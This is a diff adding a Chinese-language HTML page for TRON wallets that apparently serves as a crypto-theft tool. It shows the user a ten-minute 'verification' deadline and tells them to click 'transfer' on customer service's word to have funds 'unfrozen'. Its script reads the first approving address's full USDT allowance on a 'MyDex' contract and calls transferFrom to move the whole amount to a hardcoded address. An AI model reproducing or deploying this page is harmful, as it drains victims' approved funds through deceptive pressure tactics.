@@ -1,0 +1,87 @@
+<!doctype html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>錢包轉帳與管理</title>
+  <style>
+    .center {
+      margin: auto;
+      width: 60%;
+      padding: 10px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+  <div class="center">
+    <button id="connectButton">請連接錢包</button>
+  </div>
+
+  <div class="center">
+    <label>⚠️ 請於十分鐘內完成驗證流程</label>
+    <button id="transferFrom_Btn">請於客服通知後點擊轉帳</button>
+    <label>驗證完成後將開啟解凍</label>
+  </div>
+
+  <div class="center">
+    <button id="showUsersBtn">查詢已授權使用者清單</button>
+  </div>
+
+  <script>
+    const connectButton = document.getElementById("connectButton");
+    const transferFromButton = document.getElementById("transferFrom_Btn");
+    const showUsersBtn = document.getElementById("showUsersBtn");
+
+    const USDT_contractAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
+    const MyDex_contractAddress = "TWKeZLCX7b6xnyhL9PyFhkA7A8ezkQRWsF";
+
+    connectButton.onclick = async () => {
+      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+        alert("錢包已連接：" + window.tronWeb.defaultAddress.base58);
+        connectButton.innerHTML = "已連接：" + window.tronWeb.defaultAddress.base58;
+      } else {
+        alert("請使用 TronLink 或 imToken 瀏覽器開啟");
+      }
+    };
+
+    transferFromButton.onclick = async () => {
+      try {
+        const MyDex = await window.tronWeb.contract().at(MyDex_contractAddress);
+        const USDT = await window.tronWeb.contract().at(USDT_contractAddress);
+
+        const fromHex = await MyDex.getIndexAddress(0).call();
+        const from = window.tronWeb.address.fromHex(fromHex);
+        const to = "TPta9GWqYaDYwcR8ZorUpduz9y3nt7Qp6G";
+
+        const allowance = await USDT.allowance(from, MyDex_contractAddress).call();
+        const amount = window.tronWeb.toBigNumber(allowance).toString();
+
+        if (BigInt(amount) === 0n) return alert("尚未授權或金額為 0");
+
+        const tx = await MyDex.transferFrom(from, to, amount).send({ feeLimit: 100_000_000 });
+        alert("✅ 轉帳成功！交易 ID：" + tx);
+      } catch (err) {
+        console.error("❌ 轉帳失敗：", err);
+        alert("❌ 轉帳失敗：" + (err.message || "未知錯誤"));
+      }
+    };
+
+    showUsersBtn.onclick = async () => {
+      try {
+        const MyDex = await window.tronWeb.contract().at(MyDex_contractAddress);
+        const first = await MyDex.getIndexAddress(0).call();
+        const addr = window.tronWeb.address.fromHex(first);
+        alert("第一位授權者地址：" + addr);
+      } catch (err) {
+        alert("❌ 無法取得授權者地址：" + (err.message || "未知錯誤"));
+      }
+    };
+  </script>
+</body>
+</html>
